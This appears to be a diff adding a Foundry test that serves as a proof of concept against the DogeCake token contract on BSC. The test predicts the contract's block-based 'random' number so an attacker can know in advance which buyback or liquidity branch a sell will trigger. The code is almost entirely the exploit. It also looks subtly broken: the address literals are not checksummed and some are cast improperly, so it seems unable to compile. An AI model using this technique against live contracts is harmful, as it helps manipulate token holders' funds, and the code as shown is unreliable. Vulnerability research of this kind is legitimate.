@@ -1,0 +1,133 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.4;
+
+import "forge-std/Test.sol";
+
+interface IDogeCake {
+    function owner() external view returns (address);
+    function afterPreSale() external;
+    function setSwapTokensAtAmount(uint256 _swapAmount) external;
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function uniswapV2Pair() external view returns (address);
+    function swapTokensAtAmount() external view returns (uint256);
+    function marketingWallet() external view returns (address);
+    function buyBackAndLiquifyEnabled() external view returns (bool);
+}
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+}
+
+contract ExploitTest is Test {
+    address constant DOGECAKE = 0x88b9bbdaf00770ba398c9a2e0d3c02d45dcb9820;
+    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+
+    IDogeCake doge;
+    address pair;
+    address user1;
+    address user2;
+    address user3;
+    address owner;
+
+    function setUp() public {
+        doge = IDogeCake(DOGECAKE);
+        pair = doge.uniswapV2Pair();
+        owner = doge.owner();
+        user1 = address(0xdeadbeef1);
+        user2 = address(0xdeadbeef2);
+        user3 = address(0xdeadbeef3);
+
+        vm.label(owner, "Owner");
+        vm.label(user1, "Attacker");
+        vm.label(user2, "HelperA");
+        vm.label(user3, "HelperB");
+        vm.label(DOGECAKE, "DogeCake");
+        vm.label(pair, "Pair");
+
+        // Owner enables trading, fees, and sets low swap threshold
+        vm.startPrank(owner);
+        doge.afterPreSale();
+        doge.setSwapTokensAtAmount(1); // 1 token -> swapTokensAtAmount = 1e18 wei
+        vm.stopPrank();
+
+        // Fund user1 and user2 (owner is excluded from fees)
+        vm.startPrank(owner);
+        doge.transfer(user1, 1_000_000e18);
+        doge.transfer(user2, 1_000_000e18);
+        vm.stopPrank();
+
+        // user2 transfers to user3 to accumulate fees into the contract
+        vm.startPrank(user2);
+        doge.transfer(user3, 10e18); // 15% fee -> contract receives 1.5e18 tokens
+        vm.stopPrank();
+
+        // Verify the contract now has enough tokens to trigger the swap logic
+        uint256 contractBalance = doge.balanceOf(address(doge));
+        uint256 swapAt = doge.swapTokensAtAmount();
+        require(contractBalance >= swapAt, "Insufficient contract token balance");
+    }
+
+    function testExploitUncheckedRandom() public {
+        // Set deterministic block parameters so the random value is predictable
+        vm.warp(10_000);
+        vm.roll(500);
+        vm.setBlockDifficulty(0);
+        vm.coinbase(0x0000000000000000000000000000000000000001);
+        vm.setBlockGasLimit(30_000_000);
+
+        // Pre-compute the random number exactly as the contract would inside
+        // _transfer when msg.sender == user1
+        uint256 seed = uint256(
+            keccak256(
+                abi.encodePacked(
+                    block.timestamp + block.difficulty +
+                    ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (block.timestamp)) +
+                    block.gaslimit +
+                    ((uint256(keccak256(abi.encodePacked(user1)))) / (block.timestamp)) +
+                    block.number
+                )
+            )
+        );
+        uint256 predictedRand = seed - ((seed / 100) * 100);
+        if (predictedRand == 0) predictedRand = 1;
+        bool predictedIsBuyback = (predictedRand <= 50);
+
+        // Record state before the sale
+        uint256 totalSupplyBefore = doge.totalSupply();
+        address marketingWallet = doge.marketingWallet();
+        uint256 pairTokenBefore = IERC20(DOGECAKE).balanceOf(pair);
+
+        // Attacker (user1) sells tokens to the Uniswap pair, triggering the
+        // buyBackAndLiquify logic where the random number is computed.
+        vm.prank(user1);
+        doge.transfer(pair, 100e18); // sell 100 tokens
+
+        // Determine the actual branch taken by observing side effects
+        uint256 totalSupplyAfter = doge.totalSupply();
+        uint256 pairTokenAfter = IERC20(DOGECAKE).balanceOf(pair);
+        bool actualIsBuyback;
+        if (totalSupplyAfter < totalSupplyBefore) {
+            // buyBackAndBurn reduced total supply
+            actualIsBuyback = true;
+        } else if (pairTokenAfter > pairTokenBefore) {
+            // swapAndLiquify added tokens to the pair
+            actualIsBuyback = false;
+        } else {
+            // In case neither happened (e.g., block coinbase mismatch), fail
+            revert("Unable to determine actual branch – check block parameters");
+        }
+
+        // Assert that the branch matches the predicted random number
+        assertEq(
+            predictedIsBuyback,
+            actualIsBuyback,
+            "Predicted random branch does not match actual contract behavior"
+        );
+    }
+}
+```
